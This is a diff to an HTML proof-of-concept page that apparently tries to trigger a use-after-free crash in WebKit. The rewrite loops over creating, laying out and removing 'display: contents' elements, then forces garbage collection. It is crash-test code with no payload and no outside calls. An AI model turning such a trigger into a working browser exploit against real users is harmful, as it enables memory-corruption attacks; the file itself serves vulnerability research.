@@ -1,38 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>WebKit PoC - Use After Free Test</title>
+  <title>WebKit UAF Crash PoC</title>
+  <style>
+    #target {
+      display: contents;
+    }
+  </style>
 </head>
 <body>
+  <div id="log">Running PoC...</div>
   <script>
-    function triggerBug() {
-      let div = document.createElement("div");
-      document.body.appendChild(div);
+    function log(msg) {
+      document.getElementById('log').textContent += '\n' + msg;
+    }
 
-      // Estilo que puede provocar operaciones de render conflictivas
-      div.style.display = "contents";
+    function stressTest() {
+      for (let i = 0; i < 10000; i++) {
+        let outer = document.createElement("div");
+        outer.id = "target";
 
-      // Crear estructura interna peligrosa
-      let inner = document.createElement("span");
-      inner.textContent = "Test";
-      div.appendChild(inner);
+        let inner = document.createElement("span");
+        inner.textContent = "trigger";
 
-      // Forzar recalculo de layout/render
-      getComputedStyle(inner).color;
+        outer.appendChild(inner);
+        document.body.appendChild(outer);
 
-      // Eliminar el nodo para intentar provocar destrucción desordenada
-      div.remove();
+        // Forzar layout
+        getComputedStyle(inner).color;
 
-      // Forzar GC (sólo en navegadores con heapSize visible, como PS5)
+        // Intentar invalidar renderización
+        outer.remove();
+      }
+      log("Finished spraying. Now attempting GC...");
+
+      // Forzar GC si es posible
       try {
         if (window.gc) window.gc();
       } catch (e) {}
 
-      // Verificación mínima
-      console.log("PoC ejecutado. Revisa si hay crash, assertion o comportamiento extraño.");
+      log("PoC ejecutado. Observa si hay crash o cuelgue.");
     }
 
-    triggerBug();
+    setTimeout(stressTest, 1000);
   </script>
 </body>
 </html>
